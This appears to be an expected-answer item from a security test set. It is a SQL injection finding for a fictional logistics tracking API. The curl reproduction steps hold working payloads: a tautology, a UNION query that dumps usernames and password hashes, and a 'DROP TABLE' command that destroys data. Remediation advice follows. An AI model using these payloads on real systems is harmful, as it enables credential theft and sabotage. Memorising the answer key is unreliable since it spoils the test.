# Expected Response

## System
- System: FreightLens Tracking API v1.9.0
- Domain: LOGISTICS / SUPPLY CHAIN
- Example ID: INJ-0113
- Risk ID: RISK-INJ-113
- Vulnerability: SQL Injection (SQLi)

## Findings

### 1. SQL Injection on `/api/v1/products?tag=` (HAR Primary)

The `tag` parameter is directly interpolated into a raw SQL query without parameterization: `SELECT * FROM products WHERE tag = '${req.query.tag}'`. The HAR capture shows `tag=' OR 1=1 --` tautology injection returning all records including admin credentials. The application connects as `db_owner`, enabling DDL attacks.

**Evidence from HAR:**
- Endpoint: `GET /api/v1/products?tag=' OR 1=1 --`
- Response: HTTP 200 with all user records including `password_hash` and `role: "ADMIN"`
- Query constructed: `SELECT * FROM products WHERE tag = '' OR 1=1 --'` — evaluates true for all rows
- `db_owner` account confirmed in Section 6.0

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching product records only.

**Step 2 — SQLi tautology injection: dump all records (primary HAR attack):**
```bash
curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag=%27%20OR%201%3D1%20--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All rows returned including admin `password_hash` — as observed in HAR response.

**Step 3 — UNION data exfiltration: credential dump (db_owner):**
```bash
curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag=' UNION SELECT username,password_hash,role FROM users--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All usernames, password hashes, and roles returned — full credential exfiltration.

**Step 4 — DDL attack: destroy supply chain tracking data (db_owner):**
```bash
curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag='; DROP TABLE products--" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** `products` table dropped — complete loss of logistics/supply chain tracking data (operational sabotage).

**Step 5 — Verbose error confirmation:**
```bash
curl -s "https://api.freightlens-tra.example.com/api/v1/products?tag='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error:** SQL syntax error leaking table name `products`, column names, or DB version.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- **Parameterized queries (RISK-INJ-113):** Replace `SELECT * FROM products WHERE tag = '${req.query.tag}'` with prepared statement: `SELECT * FROM products WHERE tag = ?` with bound parameter.
- **Restrict DB account:** Application account must not run as `db_owner`; grant only `SELECT`/`INSERT`/`UPDATE`/`DELETE` on required tables.
- **Disable verbose error messages in production:** Return generic 400/500 without SQL details.
- **Deploy WAF / input validation middleware** on legacy `/api/v1/products` endpoint; reject SQL metacharacters.
- **ORM audit:** Review all `raw()` or native query calls; apply parameterization.
